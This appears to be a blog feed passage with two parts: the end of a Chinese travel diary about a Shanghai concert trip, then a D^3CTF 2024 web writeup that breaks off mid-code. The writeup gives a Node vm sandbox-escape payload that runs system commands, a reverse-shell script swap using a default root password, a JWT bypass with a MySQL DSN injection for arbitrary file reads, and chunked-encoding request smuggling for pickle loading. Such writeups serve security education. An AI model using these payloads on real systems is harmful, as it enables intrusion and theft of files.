src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716629755251-bc95b8e2-4412-4b70-9e0d-b093b2c84ae7.jpeg#averageHue=%23818fa0&clientId=u40b8badd-7d31-4&from=paste&height=480&id=u0ac4c24d&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=44614&status=done&style=none&taskId=ucc440e5e-f49a-4494-99b5-d6f9817bbb9&title=&width=640" alt="2bb54e1b93e72345f1702c9f543a43d6_720.jpg"><br>（飞机着陆）<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716629763089-d5892ecc-e922-4497-b309-d417e81887d6.jpeg#averageHue=%232f2615&clientId=u40b8badd-7d31-4&from=paste&height=841&id=uf128378a&originHeight=1707&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=63612&status=done&style=none&taskId=uf76255f7-ed65-4f01-874c-ab80ebb498a&title=&width=631" alt="78f06109e757d303dff32f2d655d8f4d_720.jpg">‘<br>一张白天一张晚上，对应起来了哈。之后在虹桥机场下机后就是一顿赶路前往M1sery的住处，M1已经在下午就已经到旅社了，我因为飞机延误直到晚上九点才下飞机，然后等着我的就是长达2小时的赶路时间。期间还发生了一件很抽象的事情<br>手机因为飞机延误电量所剩无几，当我做地铁做一半的时候发现了一件很恐怖的事情，电量只剩下了百分之五，这对没带充电宝的我简直就是降维打击。<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716629960225-e96a9dfb-32df-4719-9a17-5c4756ef0842.jpeg#averageHue=%23d6e9eb&clientId=u40b8badd-7d31-4&from=paste&height=960&id=u26269b28&originHeight=1920&originWidth=863&originalType=binary&ratio=2&rotation=0&showTitle=false&size=111970&status=done&style=none&taskId=u30fa3a76-072d-48ac-ab6e-12ef02b8882&title=&width=431.5" alt="a342052e6522b3d6254f78929a4ca2c2_720.jpg"><br>最后我选择在中途出地铁，直接打上一辆出租车前往旅社，看看是电掉的快还是车到的快.jpg。赛博意志了。<br>最后在夜晚的十一点成功与M1sery会面，我先看了看住的地方长什么样<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630035882-f938dee7-0b69-4e66-96a0-f4ee9c592ad3.jpeg#averageHue=%233b403b&clientId=u40b8badd-7d31-4&from=paste&height=854&id=u5e1df2bf&originHeight=1707&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=184873&status=done&style=none&taskId=u5e1b8691-600b-4d34-ab2a-33ee10c19cc&title=&width=640" alt="d634d5401f75a59126c1969f8b9ef8ea_720.jpg"><br>挺有生活气息的一个小道，和小学放学回家的路一样。最后一起吃了一顿夜宵烤肉，也是非常的赞不绝口啊。<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630110829-5e38ae40-1d32-48cd-bdb1-837967dc3db4.jpeg#averageHue=%234a5643&clientId=u40b8badd-7d31-4&from=paste&height=480&id=uc22c4223&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=117772&status=done&style=none&taskId=u775f1c53-ca84-4fab-93ca-a22f040d2ca&title=&width=640" alt="efed992fac78b50f6279da03a45d4b49_720.jpg"><br>M1sery老父亲的背影.jpg<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630072609-de9800ef-3c93-4b50-b503-dc500316debc.jpeg#averageHue=%23676957&clientId=u40b8badd-7d31-4&from=paste&height=360&id=u109e260f&originHeight=720&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=92496&status=done&style=none&taskId=u83c6cf5a-faff-4006-a087-37c558769e9&title=&width=640" alt="9506c24441159362a6299c8fd62a8a11_720.jpg"><br>没想到烤肉还有专门的人帮你考，保姆级了属于是。虽然4.30日十分的曲折，但好在还是到达了，明天5.1就是音律联觉，我们是下午场，因此不是很急。</p><h1 id="五月一日-音律联觉！"><a href="#五月一日-音律联觉！" class="headerlink" title="五月一日 | 音律联觉！"></a>五月一日 | 音律联觉！</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630192573-2b40c50c-97f9-45bb-9271-d790e68d45e1.jpeg#averageHue=%235a6162&clientId=u40b8badd-7d31-4&from=paste&height=720&id=u770bcdb9&originHeight=1440&originWidth=1920&originalType=binary&ratio=2&rotation=0&showTitle=false&size=555567&status=done&style=none&taskId=uce055afc-f0f5-4c2d-9877-48279d62fca&title=&width=960" alt="6566137795324f59114ac9081a7d4c78.jpg"><br>真是充满希望的一个早晨，由于昨天晚上折腾了一晚上导致我没睡好，所以几乎是睡到了十二点。。。。然后在我醒后发现另一个网友也来了，所以准备一起约到一个地方一起出发。<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630318891-cc769951-2168-4a69-9653-64b8a0eab4bd.jpeg#averageHue=%23658282&clientId=u40b8badd-7d31-4&from=paste&height=720&id=ue3f75b68&originHeight=1440&originWidth=1920&originalType=binary&ratio=2&rotation=0&showTitle=false&size=463967&status=done&style=none&taskId=u6b64dda9-a62e-4193-aa60-ddb1d441400&title=&width=960" alt="66c6783836cc1321b540f8f9418e95ce.jpg"><br>首先来到了外环站，因为是觅食时间，在顺路的地方选了一个小杨生煎（之后连续吃了2天，因为太好吃了吧）<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630379197-72e5762b-cc6d-4e32-8a63-4ce680773520.jpeg#averageHue=%236f7d5c&clientId=u40b8badd-7d31-4&from=paste&height=406&id=u3f97ed45&originHeight=1440&originWidth=1920&originalType=binary&ratio=2&rotation=0&showTitle=false&size=500259&status=done&style=none&taskId=u65263f11-db74-426b-b972-253523084af&title=&width=541" alt="a7c397d93ba1307f9b454a6db3661663.jpg">（我们3.jpg)<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630399654-39088129-b815-4701-94f0-76fa093e0792.jpeg#averageHue=%23b2916e&clientId=u40b8badd-7d31-4&from=paste&height=480&id=u9f253350&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=172099&status=done&style=none&taskId=u01c29083-7616-4dbd-81be-9db3b6bdd94&title=&width=640" alt="e6c06651eafc58c7dd04e78ace749f59_720.jpg"><br>一份一排一份生煎，简直无敌了孩子。吃得饱饱的十分满足，然后我们就继续出发坐上了前往音律联觉的大巴<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630444353-5cc52821-f09a-4574-91c8-fbb874b6b35f.jpeg#averageHue=%238d8d7b&clientId=u40b8badd-7d31-4&from=paste&height=480&id=ue4a665f7&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=116700&status=done&style=none&taskId=u60c4f145-e0bb-4ba3-b8cd-2aaf20dcde6&title=&width=640" alt="d0a24bb04e891e8b65172e965e95cf34_720.jpg"><br>这是要下大巴的时候，此时的我还不知道自己忘记了一件非常重要的事情，当我下了大巴走了一半后我们身后有一位工作人员大声卖力的喊着，谁的身份证掉了！谁的身份证掉了！谁的身份证掉了！我下意识的掏了掏我的裤裆，哟呵原来是我的掉了啊，那没事了。在这里非常感谢工作人员阿里嘎多<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630506544-8d1854d7-2762-4529-82ce-e89783888cc8.jpeg#averageHue=%236f7e9d&clientId=u40b8badd-7d31-4&from=paste&height=720&id=u912a3ab0&originHeight=1440&originWidth=1920&originalType=binary&ratio=2&rotation=0&showTitle=false&size=429521&status=done&style=none&taskId=u81116026-1a2b-45df-9c7e-fb2870b1745&title=&width=960" alt="6a53d61c2de0597233cc70618a9b6c8b.jpg"><br>随后就是漫长的排队入场时间，真的聚集了好多人呀，音律联觉。<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630534934-52d6a637-2392-47db-8824-3a71b66253b1.jpeg#averageHue=%23576361&clientId=u40b8badd-7d31-4&from=paste&height=480&id=u67d0b6fd&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=162053&status=done&style=none&taskId=ubced6f50-5698-45f8-aa7e-dc585d1b948&title=&width=640" alt="e4dd3e8e378948f263ed480b4f8a7547_720.jpg"><br>还看到了一个抽象程度拉满的人，身上挂着一堆牌子哈哈哈哈哈哈<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630555813-0a2ae288-fcd4-474a-bd06-12b232a18b6c.jpeg#averageHue=%235a5e55&clientId=u40b8badd-7d31-4&from=paste&height=540&id=u9f78874c&originHeight=1080&originWidth=1919&originalType=binary&ratio=2&rotation=0&showTitle=false&size=275755&status=done&style=none&taskId=u72b82778-5847-47bf-b539-23345764be8&title=&width=959.5" alt="17be2ce1c693889b564b0b11185cfe9b.jpg"><br>排到了场馆里面，但等着我们的是究极无敌的S型队伍（这里埋个伏笔好吧）<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630598735-e0c0f755-1b1b-49d9-ac0f-4112a4b24e88.jpeg#averageHue=%237a8165&clientId=u40b8badd-7d31-4&from=paste&height=720&id=uc539f4c4&originHeight=1440&originWidth=1920&originalType=binary&ratio=2&rotation=0&showTitle=false&size=409387&status=done&style=none&taskId=ue58e5128-350a-4731-9468-2318f73a88b&title=&width=960" alt="2fd0fe4c10500a5de71a2df9a2b01a9f.jpg"><br>MVP结算画面，成功的进入场馆内部<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630614710-e5092df7-611a-4081-9a9c-ee2af330f47e.jpeg#averageHue=%2331354d&clientId=u40b8badd-7d31-4&from=paste&height=480&id=u722d55bb&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=187769&status=done&style=none&taskId=uf8492040-7619-41c6-8dd4-859a64fefbd&title=&width=640" alt="1a5ab77a726d60f1005b7b9a7b6eea6a_720.jpg"><br>找到了我们无敌的位置，不得不说运气是真的好吧，第一排+正对舞台，看得清清楚楚，我们刚坐下没多久，就有一位”历史老师”做了进来，二话不说就发给了我们几张卡片<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630693788-983ab1cd-4ba8-4eff-ac4f-2413ed0d968a.jpeg#averageHue=%23aaab9d&clientId=u40b8badd-7d31-4&from=paste&height=709&id=uc818f37b&originHeight=1707&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=212757&status=done&style=none&taskId=u7f202234-8821-4fdc-914d-feb6a40e26a&title=&width=532" alt="95e140b286435dff63192be2d2b9e34b_720.jpg"><br>老师你画的白金真的好好看啊啊啊啊，随后就开始了长达2小时的硬控，演出开始，期间不允许拍视频和录像，虽然有安可曲时间，但是由于我狗叫时长长达一半，所以还是没放出来呜呜呜www<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716630798402-3f539168-8c77-4ce4-b4eb-5b9647cac3bb.jpeg#averageHue=%235e6360&clientId=u40b8badd-7d31-4&from=paste&height=480&id=u8a2de2df&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=196075&status=done&style=none&taskId=u7cf143b8-82cc-4221-8930-880e071544e&title=&width=640" alt="7df73e50333916c9372b7d115af7eed0_720.jpg"><br>演出结束的那时候真的好难受啊，戒断反应了，最后是StarSet乐队的主场，演奏了Infected、Monster以及另一首曲子，这一部分可以录制，给一个传送门<br><a href="https://www.bilibili.com/video/BV1XC411J7Kp/?spm_id_from=333.337.search-card.all.click">已经不想和没听过现场版《Monster》的人说话了_哔哩哔哩_bilibili</a><br>真的赞啊听的，只可意会不可言传，但是正常演出都没有一首危机合约的曲子，难受牢弟，但是中间有一首《殉道者》神父打碟，简直无敌了好吗，太带感了。<br>演出结束后我们三个人打算去聚一餐，但纠结于吃什么的问题</p><blockquote><p>M1sery：我们去吃小炒菜吧（打开美团，看了看价格）<br>M1sery：我们换一家吃的吧<br>朋友A：赞成，去徐家汇看看<br>我：CityWalk启动</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716631057971-ad7ce121-15d8-405f-8ae0-06e45a5928e5.jpeg#averageHue=%23a2715e&clientId=u40b8badd-7d31-4&from=paste&height=480&id=ued6f17b0&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=142864&status=done&style=none&taskId=u4fe7b370-39b8-4d32-a27e-bcee666a9e9&title=&width=640" alt="59ee88ee540ef2993f4f3f5cf9b928ec_720.jpg"><br>粉红色的蛋糕店，好漂亮呀<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716631089240-aa6d4f26-bccd-4498-81df-7fcf428397cf.jpeg#averageHue=%236d9ca4&clientId=u40b8badd-7d31-4&from=paste&height=480&id=ue7530471&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=135520&status=done&style=none&taskId=u4e9b8860-ead4-4d39-b4d7-4024a726a4c&title=&width=640" alt="0c363994b8a3916af598c770cff61df2_720.jpg"><br>芝士三月兽，我们本来想进去买点东西，但按耐不住经费有限，只能路过逛逛了。<br>最终兜兜转转来到了知名纪录片《人生一串》吃烧烤了<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716631126848-d0909fe3-4ded-4b97-be08-83b0d6662b0d.jpeg#averageHue=%2384977a&clientId=u40b8badd-7d31-4&from=paste&height=823&id=ua58d81eb&originHeight=1920&originWidth=1440&originalType=binary&ratio=2&rotation=0&showTitle=false&size=332133&status=done&style=none&taskId=u98cb8055-7b58-4ca4-92b6-8286b328fbb&title=&width=617" alt="286964ca0a48cfe7898564e0f5a88199.jpg"><br>黑客烧烤.jpg<br>在吃烧烤的时候我们三个疯狂的吹水，聊了好多学校的事情，也是抽象程度拉满，最后结束那一会儿因为友人A和我们不是一路的，所以他得自己一个人回去（sad），但是那时候已经很晚了，地铁也关了，所以他做出了一个惊人的决定，那就是<strong>骑共享单车</strong>骑回去。全程长达一小时<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716631349799-00b730d7-9134-453d-b01b-22a2cebfa953.jpeg#averageHue=%23eaeaea&clientId=uef6f5e45-657d-4&from=paste&height=705&id=ubf837e4c&originHeight=1410&originWidth=1028&originalType=binary&ratio=2&rotation=0&showTitle=false&size=69988&status=done&style=none&taskId=ua31a5b17-7d82-441a-af49-80cece627a5&title=&width=514" alt="bf6df37a240f6dc72d6579f45eb0c12a.jpg"><br>有操作的只能说是。最后我们也在凌晨到达酒店，搜刮了一波今天的战利品<br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716631386077-02fc1ee9-fc5e-4a7f-b8f6-313a389c1eb7.jpeg#averageHue=%23a2a6a5&clientId=uef6f5e45-657d-4&from=paste&height=480&id=uc8343be1&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=183349&status=done&style=none&taskId=u825e5664-2d46-40fd-87de-fa9a804403b&title=&width=640" alt="96651c7f99895bd3dac7c9d6fa1370d5_720.jpg"><br><img src="https://cdn.nlark.com/yuque/0/2024/jpeg/32634994/1716631388309-d724b328-6843-4d44-ab64-0e71200f6457.jpeg#averageHue=%23a2a4a0&clientId=uef6f5e45-657d-4&from=paste&height=480&id=u4797ed60&originHeight=960&originWidth=1280&originalType=binary&ratio=2&rotation=0&showTitle=false&size=162549&status=done&style=none&taskId=u1991b8f8-cd38-451b-9899-946b6aa6879&title=&width=640" alt="82e6cb4bd8a51268f10f2c0ad98edb91_720.jpg"><br>尘列出所有的战利品后心满意足的4了（</p><p>未完待续…………………</p>]]></content>
    
    
    <summary type="html">真夜中のドア - ShangHai（一）</summary>
    
    
    
    <category term="ThinkAbout" scheme="http://boogipop.com/categories/ThinkAbout/"/>
    
    
  </entry>
  
  <entry>
    <title>2024 凌武杯 x D^3CTF Web Writeup</title>
    <link href="http://boogipop.com/2024/04/30/%E5%87%8C%E6%AD%A6%E6%9D%AF%20x%20D^3CTF%20Web%20Writeup%202024/"/>
    <id>http://boogipop.com/2024/04/30/%E5%87%8C%E6%AD%A6%E6%9D%AF%20x%20D^3CTF%20Web%20Writeup%202024/</id>
    <published>2024-04-30T06:11:21.804Z</published>
    <updated>2024-04-30T06:12:19.587Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MoonBox"><a href="#MoonBox" class="headerlink" title="MoonBox"></a>MoonBox</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365402903-2c7707ba-2695-4e0a-9954-74a1d71d0eca.png#averageHue=%23242629&clientId=u02e68d95-40fb-4&from=paste&id=u4824186a&originHeight=874&originWidth=2366&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u441763b9-4fc6-4f43-b83a-b09dae1e6ee&title="><br>getRemoteAgentStartCommand<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365402930-6b569880-e8fe-480e-a5bd-334f9616aac9.png#averageHue=%23232528&clientId=u02e68d95-40fb-4&from=paste&id=u205024d9&originHeight=1060&originWidth=2180&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uad7501bb-42bf-4081-b787-8c146efecf7&title="><br>通过ps -ef和上面的分析不难发现，运行流量录制实际上是在远程服务器ssh执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;curl -o sandboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadSandBoxZipFile &amp;&amp; curl -o moonboxDownLoad.tar http://127.0.0.1:8080/api/agent/downLoadMoonBoxZipFile &amp;&amp; rm -fr ~/sandbox &amp;&amp; rm -fr ~/.sandbox-module &amp;&amp;  tar  -xzf sandboxDownLoad.tar -C ~/ &gt;&gt; /dev/null &amp;&amp; tar  -xzf moonboxDownLoad.tar -C ~/ &gt;&gt; /dev/null &amp;&amp; dos2unix ~/sandbox/bin/sandbox.sh &amp;&amp; dos2unix ~/.sandbox-module/bin/start-remote-agent.sh &amp;&amp; rm -f moonboxDownLoad.tar sandboxDownLoad.tar &amp;&amp; sh ~/.sandbox-module/bin/start-remote-agent.sh moon-box-web rc_id_df0dab78e4bbd2603a1b4e4e45cd0d08%26http%3A%2F%2F127.0.0.1%3A8080%26OFF%26OFF&#x27;</span><br></pre></td></tr></table></figure><p>所以替换moonbox里面的start-remote-agent.sh脚本就可以在远程服务器上进行rce。<br>Dockerfile里给出了root用户默认密码 root:123456，通过docker机器名moonbox-server可以访问内网的docker-moonbox-server容器，刚好这台容器有sshd，有root默认密码，并且有flag。<br>新建 “.sandbox-module\bin\start-remote-agent.sh” 写#!&#x2F;bin&#x2F;sh 反弹shell代码<br>新建 “sandbox\bin\sandbox.sh” 写 #!&#x2F;bin&#x2F;sh （否则dos2unix报错）<br>给可执行权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf moonbox.tar .sandbox-module</span><br><span class="line">tar -zcf sandbox.tar sandbox</span><br></pre></td></tr></table></figure><p>两个文件一起上传，运行流量录制 hostIp&#x3D;moonbox-server 22 root 123456即可。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403014-1f860865-f8c2-482c-9748-d5d25f80cfdb.png#averageHue=%232d2e39&clientId=u02e68d95-40fb-4&from=paste&id=u2a458978&originHeight=1088&originWidth=2342&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u1631e4a6-3063-48bb-8304-12c5b2fbaf7&title="><br>暂时无法在飞书文档外展示此内容<br>暂时无法在飞书文档外展示此内容</p><h2 id="stack-overflow"><a href="#stack-overflow" class="headerlink" title="stack_overflow"></a>stack_overflow</h2><p>注意到传入的参数可以是数组<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403021-bf317bf7-72b6-47cf-844b-a4a0ca384d96.png#averageHue=%23283038&clientId=u02e68d95-40fb-4&from=paste&id=u2300474d&originHeight=338&originWidth=1021&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ueeffc78b-6a42-412a-9ecb-1486fabdc3e&title="><br>如果args数组长度为1则不受join影响<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365402953-7b96a310-c304-4082-a602-c9302d81bd07.png#averageHue=%23282f39&clientId=u02e68d95-40fb-4&from=paste&id=uab4f98c1&originHeight=294&originWidth=905&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u86abc8f5-250c-412a-a14f-3086689b294&title="><br>据此可以闭合 js 代码，逃逸vm沙箱并执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;stdin&quot;:[&quot;&#x27;);var exec = this.constructor.constructor;var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();require(&#x27;child_process&#x27;).execSync(\&quot;cat /flag\&quot;).toString(); //&quot;]&#125;</span><br></pre></td></tr></table></figure><p>返回结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;stdout&quot;:[&quot;Starting Conversion...&quot;,&quot;Your input is:&quot;,&quot;&#x27;);var exec = this.constructor.constructor;var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();require(&#x27;child_process&#x27;).execSync(\&quot;cat /flag\&quot;).toString(); //&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;,&quot;0&quot;,&quot;...&quot;,&quot;Ascii is:&quot;,&quot;d3ctf&#123;43015f82fa648d2a60985b0b46f5739f0f40bc35&#125;\n&quot;],&quot;result&quot;:[&quot;Ascii is:&quot;,&quot;d3ctf&#123;43015f82fa648d2a60985b0b46f5739f0f40bc35&#125;\n&quot;],&quot;status&quot;:[&quot;ok&quot;]&#125;</span><br></pre></td></tr></table></figure><h2 id="Doctor"><a href="#Doctor" class="headerlink" title="Doctor"></a>Doctor</h2><p><a href="https://yearning.io/">https://yearning.io/</a><br>版本3.1.7<br><a href="https://github.com/cookieY/Yearning/releases">https://github.com/cookieY/Yearning/releases</a><br>是最新版<br>默认账号&#x2F;密码：admin&#x2F;Yearning_admin<br>远程不是默认密码，鉴权用的是JWT，远程也设置了secret-key，不是默认的<br><a href="https://github.com/cookieY/yee/blob/1c392ccd2d7dd7de0aa8964583ea1b2415179804/middleware/jwt.go#L82">https://github.com/cookieY/yee/blob/1c392ccd2d7dd7de0aa8964583ea1b2415179804/middleware/jwt.go#L82</a><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403681-317903d8-280f-4269-bcf1-ab468dfa3a0a.png#averageHue=%2342575e&clientId=u02e68d95-40fb-4&from=paste&id=u885338b8&originHeight=392&originWidth=1252&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=uf703f372-0fe8-49bb-93de-f2e3cc8e0c6&title="><br>如果是websocket请求，那么就直接return，不进行jwt读取。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403767-75380405-d997-4aa5-84f2-c1af4f36f4ba.png#averageHue=%23445c52&clientId=u02e68d95-40fb-4&from=paste&id=udbf8c70c&originHeight=322&originWidth=1728&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ud1284c4f-103e-4f0d-9022-21e4b63d7a1&title="></p><ul><li>HeaderConnection：Connection</li><li>HeaderUpgrade：Upgrade</li></ul><p>加上这2个请求头后可以访问任意接口<br>但是不是所有接口都能正常调用，需要new(lib.Token).JwtParse(c)的接口全都会报错，因为没有赋值c.Get(“auth”)<br>审计源码可以发现一处接口<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403684-726b594e-df5f-4951-88d2-28a6fd6d358b.png#averageHue=%23232427&clientId=u02e68d95-40fb-4&from=paste&id=uc22f834b&originHeight=1150&originWidth=2232&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u199af611-fdee-4b8d-b5ef-b296f780368&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403761-e8d56f46-c6c9-4971-9e5c-632401264294.png#averageHue=%23202225&clientId=u02e68d95-40fb-4&from=paste&id=u90c42fca&originHeight=826&originWidth=2262&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u93b67e2f-e08d-4258-9edb-5b77bf5b0ce&title="><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365403949-3a4d1e57-4c60-4145-8d56-83e0bc292a73.png#averageHue=%23202125&clientId=u02e68d95-40fb-4&from=paste&id=u5cd12e0a&originHeight=936&originWidth=1920&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ucd45468b-f389-488a-9546-b6352110886&title="><br>在此处发起mysql连接，由于gorm的驱动（底层是 <a href="https://github.com/go-sql-driver/mysql">https://github.com/go-sql-driver/mysql</a> ）默认是不允许任意local infile的（并且这里不可控host，如果拿到admin，可以新建数据源，就可控了），因此我们需要注入DSN参数来让它开启任意文件读取并且设置host<br>go-sql-driver&#x2F;mysql解析dsn是以最后一个&#x2F;和&#x2F;左边的最后一个@解析的。 <a href="https://github.com/go-sql-driver/mysql/blob/master/dsn.go#L357">https://github.com/go-sql-driver/mysql/blob/master/dsn.go#L357</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET with body</span><br><span class="line">http://47.100.57.142:30527/api/v2/fetch/fields?source_id=foo</span><br><span class="line">Content-Type application/json</span><br><span class="line">connection upgrade</span><br><span class="line">upgrade websocket</span><br><span class="line">&#123;</span><br><span class="line">    &quot;data_base&quot;:&quot;root:passwd@tcp(1.1.1.1:3306)/foo?allowAllFiles=true&amp;&quot;,</span><br><span class="line">    &quot;table&quot;:&quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365404379-99fd6a1e-d825-497d-a02b-966dc8ef9526.png#averageHue=%23383c44&clientId=u02e68d95-40fb-4&from=paste&id=ubbce6136&originHeight=297&originWidth=1637&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u19d23d8d-2bdd-4e9b-a928-b9b86ff3f90&title="><br>最终loadlocalfile就可以读取到flag文件。</p><h2 id="d3pythonhttp"><a href="#d3pythonhttp" class="headerlink" title="d3pythonhttp"></a>d3pythonhttp</h2><p>这道题的key其实压根没啥<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365404501-d4d66997-4f7c-4653-ab17-0cffa79e7e25.png#averageHue=%23202124&clientId=u02e68d95-40fb-4&from=paste&id=u1af01f6e&originHeight=648&originWidth=1484&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u5e80e376-4c72-4ee0-842a-e9600bc4321&title="><br>此处我们可以通过修改kid让他获取不到key，导致key默认为空即可。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365404531-26dd0d20-db78-447d-9534-a2a221b2d83c.png#averageHue=%23212225&clientId=u02e68d95-40fb-4&from=paste&id=u44523ed7&originHeight=678&originWidth=2322&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ub12b4ab0-f10a-406c-9f4e-6e34a9d3f7b&title="><br>题目在对于Chunked模式存在解析差异，当我们将chunked改为部分大写的话，此时web.py和Flask会存在解析差异<br>此时Flask会识别为chunked模式，web.py则不会<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365404602-26cbfbd1-1b71-4eb5-be6b-9b7fcdadbe7c.png#averageHue=%23212226&clientId=u02e68d95-40fb-4&from=paste&id=ua2e1fce9&originHeight=530&originWidth=1492&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=ufa311bf1-df7d-437a-a090-9b4d65faf58&title="><br>Web.py中要求全部是小写，因此到了后端服务获取到的就是根据Content-length截取的数据了，因此让请求头为<br>  Transfer-Encoding: CHunked，然后Content-length关闭自动计算长度，我们手动截取payload（opcode的base64长度）<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365404744-814844b5-7acb-493f-98c5-09738231d146.png#averageHue=%23dfe5cb&clientId=u02e68d95-40fb-4&from=paste&id=u77301ada&originHeight=2042&originWidth=3188&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u8cc7012a-35ed-4020-b6f6-74877e0b209&title="><br>  这样就可以让backend去加载opcode了<br>加一个恶意的Processer也就是filter进去就行。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1714365405025-df8cf5d3-3e3a-4897-874b-894cf3e8b79f.png#averageHue=%23c0c0c0&clientId=u02e68d95-40fb-4&from=paste&id=u60b54bd5&originHeight=1680&originWidth=3516&originalType=url&ratio=2&rotation=0&showTitle=false&status=done&style=none&taskId=u5d0e2d4d-0e6c-44b5-80b1-78803bed1be&title="></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import 